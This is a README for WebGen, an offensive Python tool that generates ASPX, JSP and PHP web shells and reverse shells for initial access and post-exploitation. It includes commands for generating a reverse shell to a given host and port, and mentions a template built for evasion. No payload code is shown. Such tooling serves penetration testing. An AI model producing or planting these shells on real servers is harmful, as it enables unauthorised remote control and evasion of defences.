# WebGen

A comprehensive generator for web-based payloads including interactive web shells and reverse shells for major server-side technologies. This tool simplifies the creation of ready-to-use payloads for web-based initial access and post-exploitation.

## Supported Technologies
- **ASPX**: Interactive web shells and reverse shells for IIS environments.
- **JSP**: Web shells and reverse shells for Apache Tomcat and other Java-based servers.
- **PHP**: Versatile shells for Apache and Nginx environments.

## Features
- **Interactive Shells**: Provides lightweight, feature-rich web interfaces for command execution.
- **Reverse Shells**: Automatically generates and configures reverse shell payloads with specified network information.
- **Payload Variety**: Supports multiple execution methods including delegates and process runners.
- **Customizable Configuration**: Allows specifying LHOST and LPORT for all reverse shell payloads.

## Usage
Generate an ASPX reverse shell for a specific IP and port:
```bash
python3 WebGen.py --type aspx --shell reverse --lhost 10.10.10.10 --lport 443 -o shell.aspx
```

Create a PHP web shell:
```bash
python3 WebGen.py --type php --shell web --output cmd.php
```

### Arguments
- `--type`: Server-side technology (aspx, jsp, php).
- `--shell`: Shell type (web, reverse).
- `--lhost/--lport`: Local network configuration for reverse shells.
- `-o, --output`: Filename for the generated web payload.

## Templates
- **templates/aspx/runner_delegate.aspx**: An ASPX runner using delegates for better evasion.
- **templates/jsp/revshell.jsp**: Standard JSP reverse shell.
- **templates/php/webshell.php**: Lightweight PHP web shell.
